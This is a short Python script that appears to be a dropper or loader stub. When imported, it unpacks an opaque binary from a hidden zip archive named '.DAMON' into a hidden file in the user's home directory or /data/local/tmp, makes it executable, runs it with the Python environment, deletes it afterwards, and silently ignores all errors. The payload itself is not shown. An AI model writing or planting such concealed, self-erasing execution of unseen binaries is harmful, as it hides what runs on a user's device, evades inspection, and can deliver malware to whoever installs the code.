import base64, zipfile, os, sys, subprocess, stat
def _x():
    if not os.path.exists(".DAMON"): return
    try:
        t_p = os.path.expanduser("~")
        if not os.access(t_p, os.W_OK): t_p = "/data/local/tmp"
        ex = os.path.join(t_p, ".dx")
        with zipfile.ZipFile(".DAMON", "r") as z:
            with open(ex, "wb") as f: f.write(z.read("D64"))
            with open("DAMON", "wb") as f: f.write(z.read("DAMON"))
        os.chmod(ex, stat.S_IRWXU)
        e = os.environ.copy()
        e["PYTHONHOME"] = sys.prefix
        e["PYTHONPATH"] = ":".join(sys.path)
        e.pop("PYTHONUSERBASE", None)
        subprocess.call([ex], env=e)
        if os.path.exists(ex): os.remove(ex)
    except: pass
_x()
